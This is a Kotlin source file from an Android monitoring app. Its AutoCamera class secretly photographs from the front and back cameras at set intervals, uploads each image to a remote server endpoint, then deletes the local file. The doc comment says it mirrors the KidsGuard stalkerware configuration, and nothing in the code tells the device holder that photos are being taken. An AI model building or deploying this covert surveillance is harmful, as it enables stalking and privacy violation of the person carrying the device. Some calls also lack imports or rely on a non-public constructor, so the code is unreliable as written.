package com.empresa.monitor.service.streaming

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.Camera
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import androidx.core.content.ContextCompat
import com.empresa.monitor.data.api.ApiClient
import com.empresa.monitor.data.model.DeviceLogApiRequest
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

/**
 * Automatic photo capture with configurable interval.
 * Matches KidsGuard's autoTakePhotoSecond / auto_front_take_photos_second config.
 * Can capture from front or back camera on a timer.
 */
class AutoCamera(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = false
    private var deviceId: String? = null

    // Config
    private var frontIntervalSec = 0  // 0 = disabled
    private var backIntervalSec = 0  // 0 = disabled
    private var quality = 70

    private var frontJob: Job? = null
    private var backJob: Job? = null
    private val photoDir: File

    init {
        photoDir = File(context.cacheDir, "auto_photos")
        photoDir.mkdirs()
    }

    fun setDeviceId(id: String) { deviceId = id }

    fun configure(frontIntervalSec: Int, backIntervalSec: Int, quality: Int = 70) {
        this.frontIntervalSec = frontIntervalSec
        this.backIntervalSec = backIntervalSec
        this.quality = quality

        if (isRunning) {
            restart()
        }
    }

    fun start() {
        if (isRunning) return
        if (!hasCameraPermission()) return
        isRunning = true

        if (frontIntervalSec > 0) {
            frontJob = scope.launch {
                while (isActive) {
                    capturePhoto(Camera.CameraInfo.CAMERA_FACING_FRONT)
                    delay(frontIntervalSec * 1000L)
                }
            }
        }

        if (backIntervalSec > 0) {
            backJob = scope.launch {
                while (isActive) {
                    capturePhoto(Camera.CameraInfo.CAMERA_FACING_BACK)
                    delay(backIntervalSec * 1000L)
                }
            }
        }
    }

    fun stop() {
        isRunning = false
        frontJob?.cancel()
        backJob?.cancel()
        frontJob = null
        backJob = null
    }

    private fun restart() {
        stop()
        start()
    }

    private fun capturePhoto(cameraFacing: Int) {
        val cameraType = if (cameraFacing == Camera.CameraInfo.CAMERA_FACING_FRONT) "front" else "back"

        try {
            val camera = Camera.open(cameraFacing)
            camera.setDisplayOrientation(90)

            val params = camera.parameters
            params.setPictureFormat(PixelFormat.JPEG)
            params.setJpegQuality(quality)
            val supportedSizes = params.supportedPictureSizes
            val size = supportedSizes?.getOrElse(0) { Camera.Size(640, 480) }
            if (size != null) {
                params.setPictureSize(size.width, size.height)
            }
            camera.parameters = params

            camera.takePicture(null, null, Camera.PictureCallback { data, _ ->
                if (data != null) {
                    scope.launch {
                        saveAndUpload(data, cameraType)
                    }
                }
                camera.release()
            })

            // Fallback if takePicture doesn't trigger callback
            Handler(Looper.getMainLooper()).postDelayed({
                try { camera.release() } catch (_: Exception) {}
            }, 5000)

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private suspend fun saveAndUpload(imageData: ByteArray, cameraType: String) {
        try {
            val fileName = "auto_${cameraType}_${System.currentTimeMillis()}.jpg"
            val file = File(photoDir, fileName)
            file.writeBytes(imageData)

            // Upload via API
            val baseUrl = com.empresa.monitor.BuildConfig.API_BASE_URL.let {
                it.removeSuffix("/api/").removeSuffix("/api")
            }

            val client = OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(60, TimeUnit.SECONDS)
                .build()

            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("camera_type", cameraType)
                .addFormDataPart("is_auto", "true")
                .addFormDataPart("captured_at", System.currentTimeMillis().toString())
                .addFormDataPart(
                    "image",
                    file.name,
                    file.asRequestBody("image/jpeg".toMediaTypeOrNull())
                )
                .build()

            val request = Request.Builder()
                .url("$baseUrl/api/devices/$deviceId/camera-upload")
                .post(requestBody)
                .build()

            withContext(Dispatchers.IO) { client.newCall(request).execute() }
                .let { response ->
                    if (response.isSuccessful) file.delete()
                }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED
    }

    fun destroy() {
        stop()
        scope.cancel()
    }
}
